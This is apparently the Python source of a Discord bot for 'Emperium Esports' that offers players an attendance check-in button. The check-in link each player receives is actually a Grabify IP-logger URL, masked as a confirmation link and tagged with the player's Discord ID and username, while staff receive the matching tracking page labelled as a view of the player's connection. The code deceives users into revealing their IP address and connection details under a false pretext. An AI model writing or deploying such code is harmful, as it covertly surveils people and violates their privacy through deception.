from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import os
import discord

# Mini servidor web falso para mantener contento a Render
class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is alive!")

def run_server():
    server = HTTPServer(('0.0.0.0', 10000), SimpleHandler)
    server.serve_forever()

# Iniciar el servidor web en un hilo secundario
threading.Thread(target=run_server, daemon=True).start()

from discord.ext import commands
from discord.ui import Button, View
import datetime

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

# ==========================================
# CONFIGURACIÓN DE IDs Y ENLACES (BLINDADO)
# ==========================================

# IDs numéricas de los canales
CANAL_SALA_ID = 1545531547149402203        # #checkin-asistencia-sala
CANAL_REPORTE_ID = 1545125674661060708     # #asistencia-reporte

# Enlaces universales configurados
LINK_JUGADOR = "https://grabify.link/ACB8Z8"
LINK_GRABIFY_REAL = "https://grabify.link/track/JT3OHZ"

# ==========================================
# CLASE DEL BOTÓN Y LÓGICA DE CHECK-IN
# ==========================================

class CheckinButton(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Confirmar Asistencia", style=discord.ButtonStyle.primary, emoji="📋", custom_id="btn_checkin_universal")
    async def confirm_attendance(self, interaction: discord.Interaction, button: Button):
        # Capturamos los datos del usuario y del canal actual
        user_id = interaction.user.id
        user_global = str(interaction.user)                 
        user_nickname = interaction.user.display_name       
        nombre_canal = interaction.channel.name             

        # Construimos los enlaces personalizados con los parámetros del usuario
        personal_link_jugador = f"{LINK_JUGADOR}?id={user_id}&user={user_global}"
        personal_link_staff = f"{LINK_GRABIFY_REAL}?id={user_id}&user={user_global}"

        # 1. Alerta automática al canal de reporte usando su ID fija
        report_channel = bot.get_channel(CANAL_REPORTE_ID)
        if report_channel:
            embed_staff = discord.Embed(
                title="🔔 Nuevo Registro de Asistencia Detectado",
                color=discord.Color.purple(),
                timestamp=datetime.datetime.now()
            )
            embed_staff.add_field(name="👤 Jugador (Mención)", value=f"{interaction.user.mention}", inline=False)
            embed_staff.add_field(name="🏷️ Apodo / Etiqueta en Servidor", value=f"`{user_nickname}`", inline=True)
            embed_staff.add_field(name="🌐 Usuario Global", value=f"`{user_global}`", inline=True)
            embed_staff.add_field(name="🆔 ID de Discord", value=f"`{user_id}`", inline=False)
            embed_staff.add_field(name="⚔️ Canal de Origen", value=f"#{nombre_canal}", inline=False)
            embed_staff.add_field(name="📊 Ver conexion de jugador", value=f"[Acceder]({personal_link_staff})", inline=False)
            embed_staff.set_footer(text="Sistema de Control - Emperium Esports")
            
            await report_channel.send(embed=embed_staff)

        # 2. Mensaje efímero que ve el jugador (con el enlace enmascarado)
        await interaction.response.send_message(
            f"✅ **Acceso de asistencia #{nombre_canal}**\n\n"
            f"Hola **{user_nickname}**,\n\n"
            f"👉 [**CONFIRMAR ASISTENCIA**]({personal_link_jugador})\n\n"
            f"*(Gracias por tu participación)*",
            ephemeral=True
        )

# ==========================================
# COMANDOS Y EVENTOS DEL BOT
# ==========================================

@bot.event
async def on_ready():
    print(f"✅ Bot conectado con éxito como {bot.user}")
    # Registramos la vista persistente para que el botón no expire nunca
    bot.add_view(CheckinButton())

@bot.command(name="setup_checkin")
@commands.has_permissions(administrator=True)
async def setup_checkin(ctx):
    """Comando para desplegar el panel de asistencia de forma universal"""
    # Verificamos que se use en el canal correcto mediante su ID
    if ctx.channel.id != CANAL_SALA_ID:
        await ctx.send(f"❌ Este comando solo se puede usar en el canal designado para la sala.", delete_after=5)
        return

    embed = discord.Embed(
        title="📋 Control de Asistencia – Emperium Esports",
        description="Haz clic en el botón de abajo para confirmar tu asistencia al roster y completar tu acceso.",
        color=discord.Color.blue()
    )
    embed.set_footer(text="Sistema Automatizado - Emperium Esports")
    
    view = CheckinButton()
    await ctx.send(embed=embed, view=view)
    await ctx.message.delete() # Borra el comando del admin para mantener limpio el canal

# El token se carga automáticamente de las variables de entorno de Render
bot.run(os.getenv("DISCORD_TOKEN"))
